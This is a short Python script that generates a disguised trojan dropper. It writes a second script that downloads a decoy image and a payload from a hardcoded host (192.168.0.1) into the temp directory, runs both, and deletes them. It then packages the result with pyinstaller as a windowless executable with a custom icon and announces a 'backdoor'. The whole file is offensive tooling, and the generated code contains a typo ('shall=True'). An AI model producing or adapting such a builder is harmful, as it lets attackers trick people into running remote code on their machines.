#!/usr/bin/env python
import optparse, subprocess, os


def argument():
    a = optparse.OptionParser()
    a.add_option("-f", "--file-download", dest="file_download", help="Download file.")
    a.add_option("-j", "--file-jpg", dest="file_jpg", help="Download file.")
    a.add_option("-n", "--name", dest="name", help="File name.")
    a.add_option("-i", "--icon", dest="icon", help="")
    (options, addr) = a.parse_args()
    if not options.file_download or not options.icon:
        a.error()
    elif not options.file_jpg or not options.name:
        a.error()
    else:
        return options


a = argument()
file = """
#!/usr/bin/env python
import requests, subprocess, os, tempfile


def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download(r"http://192.168.0.1/{0}")
subprocess.call("{0}", shall=True)
download(r"http://192.168.0.1/{1}")
subprocess.call("{1}", shall=True)
os.remove("{0}")
os.remove("{1}")
""".format(a.file_jpg, a.file_download)
with open(a.name, "wb") as file_new:
    file_new.write(file.encode('utf-8'))
    subprocess.call("pyinstaller {0} --onefile --noconsole --icon {1}".format(a.name, a.icon), shell=True)
    print("[+] New file backdoor.")
